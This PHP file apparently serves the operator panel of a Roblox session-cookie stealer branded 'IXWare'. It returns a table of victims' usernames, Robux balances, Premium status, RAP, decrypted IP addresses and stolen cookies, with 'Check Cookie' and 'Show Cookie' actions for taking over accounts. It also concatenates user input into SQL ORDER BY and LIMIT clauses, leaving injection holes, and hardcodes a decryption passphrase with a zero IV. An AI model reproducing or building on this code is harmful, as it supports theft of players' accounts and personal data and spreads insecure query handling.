<?php
    @session_start();
    include_once '../includes/config.php';
     
    header('Content-type: application/json; charset=UTF-8');

    if(isset($_SESSION['ID'])){

      $query = '';
      $query .= "SELECT * FROM `cookie_logs_old` WHERE `id`=? ";
      if(!empty($_POST["search"]["value"])){
        $query .= 'AND(`cookieName` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookieRobux` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookiePremium` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookieRolimons` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookieImage` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `ip` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookie` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `date` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%")';
      }
      if(isset($_POST["order"])){
        $column = htmlspecialchars($_POST['order']['0']['column']);
        if($column == 0){
          $query .= ' ORDER BY `cookieImage` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 1){
          $query .= ' ORDER BY `cookieName` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 2){
          $query .= ' ORDER BY `cookieRobux`+0 '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 3){
          $query .= ' ORDER BY `cookiePremium`+0 '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 4){
          $query .= ' ORDER BY `cookieRAP`+0 '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 5){
          $query .= ' ORDER BY `ip` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 6){
          $query .= ' ORDER BY `date` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }
      }
      else{
        $query .= ' ORDER BY `date` DESC ';
      }
      if($_POST["length"] != -1){
        $query .= 'LIMIT ' . htmlspecialchars($_POST['start']) . ', ' . htmlspecialchars($_POST['length']);
      }
      //echo $query;
      $stmt = $db->prepare($query);
      $stmt->execute([htmlspecialchars($_SESSION['ID'])]); 
      $results = $stmt->fetchAll();
      $row = $stmt->rowCount();
      
      $nRows = htmlspecialchars(pdoQuery($db, "SELECT COUNT(*) FROM `cookie_logs` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn());
  
      $data = array();
      foreach($results as $result){
          $img = htmlspecialchars($result['cookieImage']);
          $cookieID = htmlspecialchars($result['cookieID']);
          $rolimons = htmlspecialchars($result['cookieRolimons']);
          $data[] = array(
              "Roblox Avatar" => "<img src='$img' alt='IXWare Picture' style='height:150px'></img>",
              "Roblox UserName" => htmlspecialchars($result['cookieName']),
              "Robux" => htmlspecialchars($result['cookieRobux']),
              "Premium" => htmlspecialchars($result['cookiePremium']),
              "RAP" => htmlspecialchars($result['cookieRAP']),
              "IP" => htmlspecialchars(decrypt($result['ip'])),
              "Log Date" => htmlspecialchars($result['date']),
              "Actions" => "<form method='POST'>
              <td scope=\"row\" style='word-break:break-all;'>
                <div class='btn-group-vertical' role='group' aria-label='Vertical button group'>
                  <button type='submit' name='removeBot' value='bot' class='btn btn-outline-danger btn-sm bot-action-button bot-delete-button' data-ripple-color='dark'><i class='fas fa-trash-alt mr-2'></i>Delete</button>
                  <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' data-toggle='modal' data-target='#view-modal' data-id='$cookieID' id='checkCookie-old' data-ripple-color='dark'><i class='fas fa-cookie-bite mr-2'></i>Check Cookie</button>
                  <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' data-toggle='modal' data-target='#view-modal' data-id='$cookieID' id='showCookie-old' data-ripple-color='dark'><i class='fas fa-cookie-bite mr-2'></i>Show Cookie</button>
                  <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' onclick=\"window.open('$rolimons')\" data-ripple-color='dark'><i class='fas fa-cookie-bite mr-2'></i>Rolimons</button>
                </div>
              </td>
              <input type=\"hidden\" name=\"robloxCookie\" value=\"$cookieID\" />
              </form>"
           );
      }
  
      $draw = htmlspecialchars($_POST['draw']);
      ## Response
      $response = array(
          "draw" => intval($draw),
          "recordsTotal" => $row,
          "recordsFiltered" => $nRows,
          "data" => $data
      );
  
      echo json_encode($response);
    }else{
      echo "Hi";
    }

    function pdoQuery($con, $query, $values = array()) {
        if($values) {
            $stmt = $con->prepare($query);
            $stmt->execute($values);
        } else {
            $stmt = $con->query($query);
        }
        return $stmt;
    }
    function decrypt($text){
        $password = 'ZbkM9x4BsqjsgVdBJT5jK4Hx3cJqCZWtNcaW2wg6PN4REKf72keubesuEq4AQ5crkpsuSduh9vmNwvjRPPAxAZmUsgb4758htCrSfpF3fPdqDhkGNv5aBt7WZ7pzN9yzRkM7UWYkt8LeLFnPJkpbDZZaPAY6QgPLtPjrQuCDF6QkZn6M7gfVTnqyVvTzchRS3YJpddjHNdcuVPncmjfqegTaWbu7H43SReDy3gwFEQM6WBPKQMLDBAKb8TTga2JxfR77eRZrCeP2VVvcqmcQh3kfStFeGnFEaD2Mp7R7xrV2DaKD78KJRDkM7gabh3WcLyn8bKmpa5nV9CjSkFDZ9zx4tbz8eDfSgwJ27WRxCuZZ3EwXv5Mt7G3Y2xbpKCpQSUCvvtASPaeWzs6spG4HD7X22AsWTrbvNuna5PBZQ4K3P2QvjjNfENNpASRd7arSHcGqvMqqbvBGM6TYdyubB5kfwrc8eNaqYkTFsBHY6xW9b43JUcf43etj3PttFCxuFrqnZGWyJgZw7yvKG4yxkVJTEBv3HMXpXxPSD5b6mZSfgaaRncSZysrrLBuvvzXDganXEEwvZ29zXkSLstX5M2L7PmnpCt7bs3ZNQNSLz3PduQC4ZtjzAdf8wJhqe9xgKKDA8anCCfYt5M9jWEyVBJXXJKLzNKcWUyxdWrSEmE97GPrKSZWQADJdjgmQqxaPMF8ZWsVSLCDPnxH8tVATRqqknYfSjdjKmpFJFsdhXvWew6gkhe7bQBcxxxrgxta2Mg7KpmBDs2Ya3nGv6zq4mEcKwgBeHZnYPeqPRsUurAF6uj4e5Lq6D2c6yg2yq7Q84sMa33fnqMsGQjMhQnLpKkwSEQYENCDYHrtxbX9vGqPpYnPQgU7sRNY4uFKLhSggVAkYLe3K8Jy5UQw4WtNX9AY5gcY7wthh9Vzy8Mjt2H4P3WDHfdqe3JaMaQJQgSHxJVYvvy96CDHXxch4rm32JXZHQgtt33hMSeSvw2ZDNbkW2Ete932m8ScS4ZHcffSgCHs9bACrWDGa4ge8H4XMNYF9SuRqXhZRrfVpBzYJKS795gLu483zrWVxusaU78Z42xspzWdDpLgqTmwrMVYNwe2tGVY9h9nyNnvvKxCJwFpKCqJsL9b762rSZtyqCJLB8xk4rSPCgyZg9QG3bCcDSuYW7rES4L4f97Vb5r2Vba8dcDGtkSLb7cxPfy27prvLmBQTY4z7ymrQyDBgFsWswqCcLmwwKBdtCcVbfcvAMu4gaDbJW7R79syJ5r3fm3d3qvghrcATT8s8EXxh87APuNqEYrpLELhB4QncesnpCSqsqpj23fQpwqU8JFBgXRxAAM74NepZbfTzSV65tC6Bx3bvE78HAa2H9WRbr5EC8dHKw6A59EWHUVYVyKSxSQtTZBLUR6SXhkAdupfLruT9rqVKY2L6CBmKCuvhgxG4sRK52X6wgLCyqVXHwHShBMNLZHLWYmMFWyaud5fZBQhZKASyFe8gRb2pNLbrcRWEz6vsCt8693RTLkdm7c7GGt6y8cbWgQcD6nW89KFvbaV2QVyyrBhqrq4YzX3H3VNNrL4QTepeMKK9mV7aLRJNdqH2UxYZDgb5sFqMzufbhd73MEvAsc28JSGr7s5cAuLaMTYZgME7dzaGnw4GSe9SQEskTyDHVCtmjLNQHTGHCxnXAKLxQnAUencCCChWCL2mV9UnquqRccUAyngvNrUAyR9LmnQzkxqXYA6abFyspLjXAvtjyCKwNxWpxbRFaLedzpuE2X64zDmZ2FEqP4JU98VRQNaxSP99h6TRd8RUaveDpns3N3bDyWqJZeXQAm5xfaHPnQQHwUEf2HWaqepsxsPS72uayVtY4DvzNkXhSG47HWY2fAhZJm5mkhMpS8wVrmLtESmqBTJTHvUQLAwKMnW5GHUmsFuhBYdU263q9yCrFVVG66Mwc8XGZR5WW4wYsHjyjvVx8FadrzHAxCYjZdwJhhhYuXFLwsASn2aas26u3RrvuwDPnJ8w9qY4EFRuBukY6h7BjEkmGezauk5XcWdK';
        $method = 'aes-256-cbc';
    
        $password = substr(hash('sha256', $password, true), 0, 32);
        $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
        $decrypted = openssl_decrypt(base64_decode($text), $method, $password, OPENSSL_RAW_DATA, $iv);
    
        return $decrypted;
    }
?>